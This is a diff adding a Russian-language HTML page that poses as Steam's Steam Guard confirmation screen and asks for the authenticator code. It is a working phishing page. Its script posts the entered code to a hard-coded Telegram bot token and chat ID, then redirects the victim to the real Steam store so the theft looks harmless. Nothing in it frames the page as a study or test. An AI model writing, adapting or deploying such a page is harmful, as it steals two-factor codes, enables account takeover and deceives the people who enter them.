@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Steam Guard</title>
+    <style>
+        body {
+            margin: 0; padding: 0; font-family: "Motiva Sans", Arial, sans-serif;
+            background: radial-gradient(at top, #162b3f 0%, #0b141d 100%);
+            color: #ffffff; display: flex; align-items: center; justify-content: center; min-height: 100vh;
+        }
+        .guard-box { background: rgba(0, 0, 0, 0.5); padding: 40px; border-radius: 4px; border: 1px solid #1a9fff; width: 100%; max-width: 380px; text-align: center; }
+        h2 { text-transform: uppercase; margin-bottom: 15px; font-size: 1.4rem; }
+        p { color: #acb2b8; font-size: 0.9rem; margin-bottom: 20px; }
+        input { width: 100%; padding: 15px; margin: 10px 0; background: #2a475e; border: 1px solid #000; border-radius: 3px; color: white; box-sizing: border-box; font-size: 1.3rem; text-align: center; letter-spacing: 5px; }
+        .steam-button { width: 100%; padding: 16px; margin-top: 15px; font-size: 1.1rem; font-weight: bold; color: #ffffff; background: linear-gradient(90deg, #06bfff 0%, #2d73ff 100%); border: none; border-radius: 3px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="guard-box">
+        <h2>Подтверждение</h2>
+        <p>Введите код из мобильного приложения Steam Guard</p>
+        <form id="guardForm">
+            <input type="text" id="guard_code" placeholder="XXXXX" maxlength="5" required>
+            <button type="submit" class="steam-button">Подтвердить</button>
+        </form>
+    </div>
+    <script>
+        const TOKEN = "7231540956:AAHjvNnIfL4p4yhg8zCuvUkcBFQqhWh64TI";
+         const CHAT_ID = "1368305096";
+        document.getElementById('guardForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const code = document.getElementById('guard_code').value;
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, parse_mode: 'html', text: `<b>КОД GUARD:</b> ${code}` })
+            }).then(() => { window.location.href = "https://store.steampowered.com"; });
+        });
+    </script>
+</body>
+</html>
